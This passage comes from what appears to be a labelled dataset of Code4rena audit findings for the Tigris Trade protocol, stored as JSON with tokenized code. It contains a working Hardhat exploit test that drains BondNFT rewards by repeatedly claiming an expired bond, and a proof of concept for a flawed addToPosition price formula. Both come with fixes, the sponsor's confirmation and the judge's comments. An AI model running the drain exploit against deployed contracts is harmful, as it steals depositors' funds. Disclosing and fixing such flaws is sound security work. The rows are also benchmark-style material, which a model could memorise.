tokens\\n+\\nconst\\nTotalRewards\\n=\\nparseEther\\n(\\n8000\\n);\\n+\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nowner\\n).\\nmintFor\\n(\\nowner\\n.\\naddress\\n,\\nTotalRewards\\n);\\n+\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nowner\\n).\\nmintFor\\n(\\nuser\\n.\\naddress\\n,\\nparseEther\\n(\\n1000\\n));\\n+\\nconst\\nhacker\\n=\\nrndAddress\\n;\\n+\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nowner\\n).\\nmintFor\\n(\\nhacker\\n.\\naddress\\n,\\nparseEther\\n(\\n2000\\n+\\n700\\n));\\n+\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nhacker\\n).\\napprove\\n(\\nLock\\n.\\naddress\\n,\\nparseEther\\n(\\n2000\\n));\\n+\\n+\\n// bond1 - user\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nuser\\n).\\nlock\\n(\\nStableToken\\n.\\naddress\\n,\\nparseEther\\n(\\n1000\\n),\\n100\\n);\\n+\\nawait\\nbond\\n.\\ndistribute\\n(\\nstabletoken\\n.\\naddress\\n,\\nparseEther\\n(\\n3800\\n));\\n+\\nexpect\\n(\\nawait\\nbond\\n.\\npending\\n(\\n1\\n)).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nparseEther\\n(\\n3800\\n),\\ngwei\\n);\\n+\\n// Skip some time\\n+\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_increaseTime\\\"\\n, [\\n20\\n*\\n86400\\n]);\\n+\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_mine\\\"\\n);\\n+\\n+\\n// bond2 - hacker\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nhacker\\n).\\nlock\\n(\\nStableToken\\n.\\naddress\\n,\\nparseEther\\n(\\n1000\\n),\\n10\\n);\\n+\\n// bond3 - hacker\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nhacker\\n).\\nlock\\n(\\nStableToken\\n.\\naddress\\n,\\nparseEther\\n(\\n1000\\n),\\n100\\n);\\n+\\n+\\nawait\\nbond\\n.\\ndistribute\\n(\\nstabletoken\\n.\\naddress\\n,\\nparseEther\\n(\\n2100\\n));\\n+\\n+\\n// Skip 10+ days, bond2 is expired\\n+\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_increaseTime\\\"\\n, [\\n13\\n*\\n86400\\n]);\\n+\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_mine\\\"\\n);\\n+\\nawait\\nbond\\n.\\ndistribute\\n(\\nstabletoken\\n.\\naddress\\n,\\nparseEther\\n(\\n2100\\n));\\n+\\n+\\n// check balances before hack\\n+\\nlet\\nst\\n=\\nawait\\ngetState\\n();\\n+\\nexpect\\n(\\nst\\n.\\nbond\\n).\\nto\\n.\\nbe\\n.\\nequals\\n(\\nTotalRewards\\n);\\n+\\nexpect\\n(\\nst\\n.\\nlock\\n).\\nto\\n.\\nbe\\n.\\nequals\\n(\\nparseEther\\n(\\n3000\\n));\\n+\\nexpect\\n(\\nst\\n.\\nhacker\\n).\\nto\\n.\\nbe\\n.\\nequals\\n(\\nparseEther\\n(\\n0\\n+\\n700\\n));\\n+\\nexpect\\n(\\nst\\n.\\npending1\\n).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nparseEther\\n(\\n3800\\n+\\n1000\\n+\\n1000\\n),\\ngwei\\n);\\n+\\nexpect\\n(\\nst\\n.\\npending2\\n).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nparseEther\\n(\\n100\\n),\\ngwei\\n);\\n+\\nexpect\\n(\\nst\\n.\\npending3\\n).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nparseEther\\n(\\n1000\\n+\\n1000\\n),\\ngwei\\n);\\n+\\n+\\n// first claim of expired bond2\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nhacker\\n).\\nclaim\\n(\\n2\\n);\\n+\\nst\\n=\\nawait\\ngetState\\n();\\n+\\nexpect\\n(\\nst\\n.\\nbond\\n).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nTotalRewards\\n.\\nsub\\n(\\nparseEther\\n(\\n100\\n)),\\ngwei\\n);\\n+\\nexpect\\n(\\nst\\n.\\nhacker\\n).\\nto\\n.\\nbe\\n.\\ncloseTo\\n(\\nparseEther\\n(\\n100\\n+\\n700\\n),\\ngwei\\n);\\n+\\nexpect\\n(\\nst\\n.\\npending1\\n).\\nto\\n.\\nbe\\n.\\ngt\\n(\\nparseEther\\n(\\n3800\\n+\\n1000\\n+\\n1000\\n));\\n+\\nexpect\\n(\\nst\\n.\\npending2\\n).\\nto\\n.\\nbe\\n.\\neq\\n(\\nparseEther\\n(\\n0\\n));\\n+\\nexpect\\n(\\nst\\n.\\npending3\\n).\\nto\\n.\\nbe\\n.\\ngt\\n(\\nparseEther\\n(\\n1000\\n+\\n1000\\n));\\n+\\n+\\n// hack\\n+\\nconst\\nremainReward\\n=\\nst\\n.\\nbond\\n;\\n+\\nlet\\npending3\\n=\\nst\\n.\\npending3\\n;\\n+\\nlet\\ni\\n=\\n0\\n;\\n+\\nfor\\n(;\\nremainReward\\n.\\ngt\\n(\\npending3\\n);\\ni\\n++) {\\n+\\n// claim expired bond2 repeatedly\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nhacker\\n).\\nclaim\\n(\\n2\\n);\\n+\\n// pending3 keeps increasing\\n+\\npending3\\n=\\nawait\\nbond\\n.\\npending\\n(\\n3\\n);\\n+      }\\n+\\nconsole\\n.\\nlog\\n(\\n`claim count:\\n${\\ni\\n}\\n\\\\n\\nremain:\\n${\\nethers\\n.\\nutils\\n.\\nformatEther\\n(\\nremainReward\\n)\\n}\\n\\\\n\\npending3:\\n${\\nethers\\n.\\nutils\\n.\\nformatEther\\n(\\npending3\\n)\\n}\\n\\\\n\\n`\\n);\\n+\\n+\\n// send diff, then drain rewards in bond\\n+\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nhacker\\n).\\ntransfer\\n(\\nbond\\n.\\naddress\\n,\\npending3\\n.\\nsub\\n(\\nremainReward\\n));\\n+\\nawait\\nlock\\n.\\nconnect\\n(\\nhacker\\n).\\nclaim\\n(\\n3\\n);\\n+\\nst\\n=\\nawait\\ngetState\\n();\\n+\\n// !! bond is drained !!\\n+\\nexpect\\n(\\nst\\n.\\nbond\\n).\\nto\\n.\\nbe\\n.\\neq\\n(\\n0\\n);\\n+\\n// !! hacker gets all rewards !!\\n+\\nexpect\\n(\\nst\\n.\\nhacker\\n).\\nto\\n.\\nbe\\n.\\neq\\n(\\nTotalRewards\\n.\\nadd\\n(\\nparseEther\\n(\\n700\\n)));\\n+\\nexpect\\n(\\nst\\n.\\npending1\\n).\\nto\\n.\\nbe\\n.\\ngt\\n(\\nparseEther\\n(\\n3800\\n+\\n1000\\n+\\n1000\\n));\\n+\\nexpect\\n(\\nst\\n.\\npending2\\n).\\nto\\n.\\nbe\\n.\\neq\\n(\\n0\\n);\\n+\\nexpect\\n(\\nst\\n.\\npending3\\n).\\nto\\n.\\nbe\\n.\\neq\\n(\\n0\\n);\\n+    });\\n});\\n+\\ndescribe\\n(\\n\\\"Withdrawing\\\"\\n,\\nfunction\\n() {\\nit\\n(\\n\\\"Only expired bonds can be withdrawn\\\"\\n,\\nasync\\nfunction\\n() {\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nowner\\n).\\nmintFor\\n(\\nowner\\n.\\naddress\\n,\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\n\\\"100\\\"\\n));\",\n      \"Output:\",\n      \"Bonds\\nRewards\\nclaim count: 41\\nremain: 7900.000000000000000002\\npending3: 8055.7342616570405578\\n‚úì Drain BondNFT rewards\\n1 passing (4s)\"\n    ],\n    \"recommended_mitigation\": [\n      \"I recommend that an expired bond should be forced torelease(),claim()an expired bond should revert.\",\n      \"Sample code:\",\n      \"diff\\n--\\ngit\\na\\n/\\ncontracts\\n/\\nBondNFT\\n.\\nsol\\nb\\n/\\ncontracts\\n/\\nBondNFT\\n.\\nsol\\nindex\\n33\\na6e76\\n..77\\ne85ae\\n100644\\n---\\na\\n/\\ncontracts\\n/\\nBondNFT\\n.\\nsol\\n+++\\nb\\n/\\ncontracts\\n/\\nBondNFT\\n.\\nsol\\n@@ -\\n148\\n,\\n7\\n+\\n148\\n,\\n7\\n@@\\ncontract\\nBondNFT\\nis\\nERC721Enumerable\\n,\\nOwnable\\n{\\namount\\n=\\nbond\\n.\\namount\\n;\\nunchecked\\n{\\ntotalShares\\n[\\nbond\\n.\\nasset\\n] -=\\nbond\\n.\\nshares\\n;\\n-            (\\nuint256\\n_claimAmount\\n,) =\\nclaim\\n(\\n_id\\n,\\nbond\\n.\\nowner\\n);\\n+            (\\nuint256\\n_claimAmount\\n,) =\\n_claim\\n(\\n_id\\n,\\nbond\\n.\\nowner\\n);\\namount\\n+=\\n_claimAmount\\n;\\n}\\nasset\\n=\\nbond\\n.\\nasset\\n;\\n@@ -\\n157\\n,\\n8\\n+\\n157\\n,\\n9\\n@@\\ncontract\\nBondNFT\\nis\\nERC721Enumerable\\n,\\nOwnable\\n{\\n_burn\\n(\\n_id\\n);\\nemit\\nRelease\\n(\\nasset\\n,\\nlockAmount\\n,\\n_owner\\n,\\n_id\\n);\\n}\\n+\\n/**\\n-     *\\n@notice\\nClaim rewards from a bond\\n+     *\\n@notice\\nClaim rewards from an unexpired bond\\n*\\n@dev\\nShould only be called by a manager contract\\n*\\n@param\\n_id\\nID of the bond to claim rewards from\\n*\\n@param\\n_claimer\\naddress claiming rewards\\n@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {\\nfunction claim(\\nuint _id,\\naddress _claimer\\n+    ) public onlyManager() returns(uint amount, address tigAsset) {\\n+        Bond memory bond = idToBond(_id);\\n+        require(!bond.expired, \\\"expired\\\");\\n+        return _claim(_id, _claimer);\\n+    }\\n+\\n+    /**\\n+     *\\n@notice\\nClaim rewards from a releasing bond or an unexpired bond\\n+     *\\n@param\\n_id\\nID of the bond to claim rewards from\\n+     *\\n@param\\n_claimer\\naddress claiming rewards\\n+     *\\n@return\\namount amount of tigAsset claimed\\n+     *\\n@return\\ntigAsset tigAsset token address\\n+     */\\n+\\nfunction\\n_claim\\n(\\n+\\nuint\\n_id\\n,\\n+\\naddress\\n_claimer\\n)\\npublic\\nonlyManager\\n()\\nreturns\\n(\\nuint\\namount\\n,\\naddress\\ntigAsset\\n) {\\nBond\\nmemory\\nbond\\n=\\nidToBond\\n(\\n_id\\n);\\nrequire\\n(\\n_claimer\\n==\\nbond\\n.\\nowner\\n,\\n\\\"!owner\\\"\\n);\",\n      \"TriHaz (Tigris Trade) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.Because the findings doesn‚Äôt just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.\",\n      \"GainsGoblin (Tigris Trade) resolved:\",\n      \"Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 188,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Incorrect calculation of new price while adding position\\\"\",\n    \"line\": \"Trading[255,295]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-tigris#h-06-incorrect-calculation-of-new-price-while-adding-position\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byKingNFT\",\n      \"The formula used for calculating_newPriceinaddToPosition()function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.\",\n      \"The wrong formula\",\n      \"The correct formula is\",\n      \"Why this works?\",\n      \"Given\",\n      \"Then\",\n      \"proven.\",\n      \"Hardhat\"\n    ],\n    \"code_blocks\": [\n      \"uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\",\n      \"uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\",\n      \"P1 = _trade.price\\nP2 = _price\\nP = _newPrice\\nM1 = _trade.margin\\nM2 = _addMargin\\nM =  M1 + M2 = _newMargin\\nL = _trade.leverage\\nU1 = M1 * L  = old position in USD\\nU2 = M2 * L = new position in USD\\nU = U1 + U2 = total position in USD\\nE1 = U1 / P1 = old position of base asset, such as ETH, of the pair\\nE2 = U2 / P2 = new position of base asset of the pair\\nE = E1 + E2 = total position of base asset of the pair\",\n      \"P = U / E\\n= (U1 + U2) / (E1 + E2)\\n= (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)\\n= P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)\\n= P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)\\n= P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]\\n= P1 * P2 * M / (M1 * P2 + M2 * P1)\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.\",\n      \"const { expect } = require(\\\"chai\\\");\\nconst { deployments, ethers, waffle } = require(\\\"hardhat\\\");\\nconst { parseEther, formatEther } = ethers.utils;\\nconst { signERC2612Permit } = require('eth-permit');\\nconst exp = require(\\\"constants\\\");\\ndescribe(\\\"Incorrect calculation of new margin price while adding position\\\", function () {\\nlet owner;\\nlet node;\\nlet user;\\nlet node2;\\nlet node3;\\nlet proxy;\\nlet Trading;\\nlet trading;\\nlet TradingExtension;\\nlet tradingExtension;\\nlet TradingLibrary;\\nlet tradinglibrary;\\nlet StableToken;\\nlet stabletoken;\\nlet StableVault;\\nlet stablevault;\\nlet position;\\nlet pairscontract;\\nlet referrals;\\nlet permitSig;\\nlet permitSigUsdc;\\nlet MockDAI;\\nlet mockdai;\\nlet MockUSDC;\\nlet mockusdc;\\nlet badstablevault;\\nlet chainlink;\\nbeforeEach(async function () {\\nawait deployments.fixture(['test']);\\n[owner, node, user, node2, node3, proxy] = await ethers.getSigners();\\nStableToken = await deployments.get(\\\"StableToken\\\");\\nstabletoken = await ethers.getContractAt(\\\"StableToken\\\", StableToken.address);\\nTrading = await deployments.get(\\\"Trading\\\");\\ntrading = await ethers.getContractAt(\\\"Trading\\\", Trading.address);\\nawait trading.connect(owner).setMaxWinPercent(5e10);\\nTradingExtension = await deployments.get(\\\"TradingExtension\\\");\\ntradingExtension = await ethers.getContractAt(\\\"TradingExtension\\\", TradingExtension.address);\\nconst Position = await deployments.get(\\\"Position\\\");\\nposition = await ethers.getContractAt(\\\"Position\\\", Position.address);\\nMockDAI = await deployments.get(\\\"MockDAI\\\");\\nmockdai = await ethers.getContractAt(\\\"MockERC20\\\", MockDAI.address);\\nMockUSDC = await deployments.get(\\\"MockUSDC\\\");\\nmockusdc = await ethers.getContractAt(\\\"MockERC20\\\", MockUSDC.address);\\nconst PairsContract = await deployments.get(\\\"PairsContract\\\");\\npairscontract = await ethers.getContractAt(\\\"PairsContract\\\", PairsContract.address);\\nconst Referrals = await deployments.get(\\\"Referrals\\\");\\nreferrals = await ethers.getContractAt(\\\"Referrals\\\", Referrals.address);\\nStableVault = await deployments.get(\\\"StableVault\\\");\\nstablevault = await ethers.getContractAt(\\\"StableVault\\\", StableVault.address);\\nawait stablevault.connect(owner).listToken(MockDAI.address);\\nawait stablevault.connect(owner).listToken(MockUSDC.address);\\nawait tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\\nawait tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\\\"1\\\"));\\nawait tradingExtension.connect(owner).setNode(node.address, true);\\nawait tradingExtension.connect(owner).setNode(node2.address, true);\\nawait tradingExtension.connect(owner).setNode(node3.address, true);\\nawait network.provider.send(\\\"evm_setNextBlockTimestamp\\\", [2000000000]);\\nawait network.provider.send(\\\"evm_mine\\\");\\npermitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\\npermitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\\nconst BadStableVault = await ethers.getContractFactory(\\\"BadStableVault\\\");\\nbadstablevault = await BadStableVault.deploy(StableToken.address);\\nconst ChainlinkContract = await ethers.getContractFactory(\\\"MockChainlinkFeed\\\");\\nchainlink = await ChainlinkContract.deploy();\\nTradingLibrary = await deployments.get(\\\"TradingLibrary\\\");\\ntradinglibrary = await ethers.getContractAt(\\\"TradingLibrary\\\", TradingLibrary.address);\\nawait trading.connect(owner).setLimitOrderPriceRange(1e10);\\n});\\ndescribe(\\\"Initial margin $500, leverage 2x, position $1000, price $1000\\\", function () {\\nlet orderId;\\nlet initPrice = parseEther(\\\"1000\\\");\\nbeforeEach(async function () {\\n// To simpliy the problem, set fees to 0\\nawait trading.setFees(true, 0, 0, 0, 0, 0);\\nawait trading.setFees(false, 0, 0, 0, 0, 0);\\nlet TradeInfo = [parseEther(\\\"500\\\"), MockDAI.address, StableVault.address, parseEther(\\\"2\\\"), 1, true, parseEther(\\\"0\\\"), parseEther(\\\"0\\\"), ethers.constants.HashZero];\\nlet PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\\nlet message = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, initPrice, 0, 2000000000, false]\\n)\\n);\\nlet sig = await node.signMessage(\\nBuffer.from(message.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\\norderId = await position.getCount();\\nawait trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\\nexpect(await position.assetOpenPositionsLength(1)).to.equal(1);\\nlet trade = await position.trades(orderId);\\nlet marginAfterFee = trade.margin;\\nexpect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\\nexpect(trade.price.eq(parseEther('1000'))).to.be.true;\\nexpect(trade.leverage.eq(parseEther('2'))).to.be.true;\\n});\\nit.only(\\\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\\\", async function () {\\n// The price increases from $1000 to $2000, the old position earns $1000 profit.\\n// The expected PnL payout = old margin + earned profit + new margin\\n//                         = $500 + $1000 + $500\\n//                         = $2000\\nlet addingPrice = parseEther('2000');\\nlet addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\\nlet addingMessage = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, addingPrice, 0, 2000000000, false]\\n)\\n);\\nlet addingSig = await node.signMessage(\\nBuffer.from(addingMessage.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\\nawait trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\\nlet trade = await position.trades(orderId);\\nlet pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\\ntrade.margin, trade.leverage, trade.accInterest);\\nexpect(pnl._payout.gt(parseEther('1666'))).to.be.true;\\nexpect(pnl._payout.lt(parseEther('1667'))).to.be.true;\\n});\\nit.only(\\\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\\\", async function () {\\n// The price decreases from $1000 to $750, the old position losses $250.\\n// The expected PnL payout = old margin - loss + new margin\\n//                         = $500 - $250 + $500\\n//                         = $750\\nlet addingPrice = parseEther('750');\\nlet addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\\nlet addingMessage = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, addingPrice, 0, 2000000000, false]\\n)\\n);\\nlet addingSig = await node.signMessage(\\nBuffer.from(addingMessage.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\\nawait trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\\nlet trade = await position.trades(orderId);\\nlet pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\\ntrade.margin, trade.leverage, trade.accInterest);\\nexpect(pnl._payout.gt(parseEther('714'))).to.be.true;\\nexpect(pnl._payout.lt(parseEther('715'))).to.be.true;\\n});\\n});\\n});\",\n      \"The test result\",\n      \"Incorrect calculation of new margin price while adding position\\nInitial margin $500, leverage 2x, position $1000, price $1000\\n‚àö Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\\n‚àö Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use the correct formula, the following test case is for the same above examples after fix.\",\n      \"const { expect } = require(\\\"chai\\\");\\nconst { deployments, ethers, waffle } = require(\\\"hardhat\\\");\\nconst { parseEther, formatEther } = ethers.utils;\\nconst { signERC2612Permit } = require('eth-permit');\\nconst exp = require(\\\"constants\\\");\\ndescribe(\\\"Correct calculation of new margin price while adding position\\\", function () {\\nlet owner;\\nlet node;\\nlet user;\\nlet node2;\\nlet node3;\\nlet proxy;\\nlet Trading;\\nlet trading;\\nlet TradingExtension;\\nlet tradingExtension;\\nlet TradingLibrary;\\nlet tradinglibrary;\\nlet StableToken;\\nlet stabletoken;\\nlet StableVault;\\nlet stablevault;\\nlet position;\\nlet pairscontract;\\nlet referrals;\\nlet permitSig;\\nlet permitSigUsdc;\\nlet MockDAI;\\nlet mockdai;\\nlet MockUSDC;\\nlet mockusdc;\\nlet badstablevault;\\nlet chainlink;\\nbeforeEach(async function () {\\nawait deployments.fixture(['test']);\\n[owner, node, user, node2, node3, proxy] = await ethers.getSigners();\\nStableToken = await deployments.get(\\\"StableToken\\\");\\nstabletoken = await ethers.getContractAt(\\\"StableToken\\\", StableToken.address);\\nTrading = await deployments.get(\\\"Trading\\\");\\ntrading = await ethers.getContractAt(\\\"Trading\\\", Trading.address);\\nawait trading.connect(owner).setMaxWinPercent(5e10);\\nTradingExtension = await deployments.get(\\\"TradingExtension\\\");\\ntradingExtension = await ethers.getContractAt(\\\"TradingExtension\\\", TradingExtension.address);\\nconst Position = await deployments.get(\\\"Position\\\");\\nposition = await ethers.getContractAt(\\\"Position\\\", Position.address);\\nMockDAI = await deployments.get(\\\"MockDAI\\\");\\nmockdai = await ethers.getContractAt(\\\"MockERC20\\\", MockDAI.address);\\nMockUSDC = await deployments.get(\\\"MockUSDC\\\");\\nmockusdc = await ethers.getContractAt(\\\"MockERC20\\\", MockUSDC.address);\\nconst PairsContract = await deployments.get(\\\"PairsContract\\\");\\npairscontract = await ethers.getContractAt(\\\"PairsContract\\\", PairsContract.address);\\nconst Referrals = await deployments.get(\\\"Referrals\\\");\\nreferrals = await ethers.getContractAt(\\\"Referrals\\\", Referrals.address);\\nStableVault = await deployments.get(\\\"StableVault\\\");\\nstablevault = await ethers.getContractAt(\\\"StableVault\\\", StableVault.address);\\nawait stablevault.connect(owner).listToken(MockDAI.address);\\nawait stablevault.connect(owner).listToken(MockUSDC.address);\\nawait tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\\nawait tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\\\"1\\\"));\\nawait tradingExtension.connect(owner).setNode(node.address, true);\\nawait tradingExtension.connect(owner).setNode(node2.address, true);\\nawait tradingExtension.connect(owner).setNode(node3.address, true);\\nawait network.provider.send(\\\"evm_setNextBlockTimestamp\\\", [2000000000]);\\nawait network.provider.send(\\\"evm_mine\\\");\\npermitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\\npermitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\\nconst BadStableVault = await ethers.getContractFactory(\\\"BadStableVault\\\");\\nbadstablevault = await BadStableVault.deploy(StableToken.address);\\nconst ChainlinkContract = await ethers.getContractFactory(\\\"MockChainlinkFeed\\\");\\nchainlink = await ChainlinkContract.deploy();\\nTradingLibrary = await deployments.get(\\\"TradingLibrary\\\");\\ntradinglibrary = await ethers.getContractAt(\\\"TradingLibrary\\\", TradingLibrary.address);\\nawait trading.connect(owner).setLimitOrderPriceRange(1e10);\\n});\\ndescribe(\\\"Initial margin $500, leverage 2x, position $1000, price $1000\\\", function () {\\nlet orderId;\\nlet initPrice = parseEther(\\\"1000\\\");\\nbeforeEach(async function () {\\n// To simpliy the problem, set fees to 0\\nawait trading.setFees(true, 0, 0, 0, 0, 0);\\nawait trading.setFees(false, 0, 0, 0, 0, 0);\\nlet TradeInfo = [parseEther(\\\"500\\\"), MockDAI.address, StableVault.address, parseEther(\\\"2\\\"), 1, true, parseEther(\\\"0\\\"), parseEther(\\\"0\\\"), ethers.constants.HashZero];\\nlet PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\\nlet message = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, initPrice, 0, 2000000000, false]\\n)\\n);\\nlet sig = await node.signMessage(\\nBuffer.from(message.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\\norderId = await position.getCount();\\nawait trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\\nexpect(await position.assetOpenPositionsLength(1)).to.equal(1);\\nlet trade = await position.trades(orderId);\\nlet marginAfterFee = trade.margin;\\nexpect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\\nexpect(trade.price.eq(parseEther('1000'))).to.be.true;\\nexpect(trade.leverage.eq(parseEther('2'))).to.be.true;\\n});\\nit.only(\\\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\\\", async function () {\\n// The price increases from $1000 to $2000, the old position earns $1000 profit.\\n// The expected PnL payout = old margin + earned profit + new margin\\n//                         = $500 + $1000 + $500\\n//                         = $2000\\nlet addingPrice = parseEther('2000');\\nlet addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\\nlet addingMessage = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, addingPrice, 0, 2000000000, false]\\n)\\n);\\nlet addingSig = await node.signMessage(\\nBuffer.from(addingMessage.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\\nawait trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\\nlet trade = await position.trades(orderId);\\nlet pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\\ntrade.margin, trade.leverage, trade.accInterest);\\nexpect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;\\nexpect(pnl._payout.lt(parseEther('2000'))).to.be.true;\\n});\\nit.only(\\\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\\\", async function () {\\n// The price decreases from $1000 to $750, the old position losses $250.\\n// The expected PnL payout = old margin - loss + new margin\\n//                         = $500 - $250 + $500\\n//                         = $750\\nlet addingPrice = parseEther('750');\\nlet addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\\nlet addingMessage = ethers.utils.keccak256(\\nethers.utils.defaultAbiCoder.encode(\\n['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\\n[node.address, 1, addingPrice, 0, 2000000000, false]\\n)\\n);\\nlet addingSig = await node.signMessage(\\nBuffer.from(addingMessage.substring(2), 'hex')\\n);\\nlet PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\\nawait trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\\nlet trade = await position.trades(orderId);\\nlet pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\\ntrade.margin, trade.leverage, trade.accInterest);\\nexpect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;\\nexpect(pnl._payout.lt(parseEther('750'))).to.be.true;\\n});\\n});\\n});\",\n      \"The test result\",\n      \"Correct calculation of new margin price while adding position\\nInitial margin $500, leverage 2x, position $1000, price $1000\\n‚àö Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\\n‚àö Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\",\n      \"TriHaz (Tigris Trade) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has shown how, usingaddToPositioncan cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.\",\n      \"GainsGoblin (Tigris Trade) resolved:\",\n      \"Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 189,\n    \"bug_id\": \" H-09\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 4,\n    \"bug_description\": \" 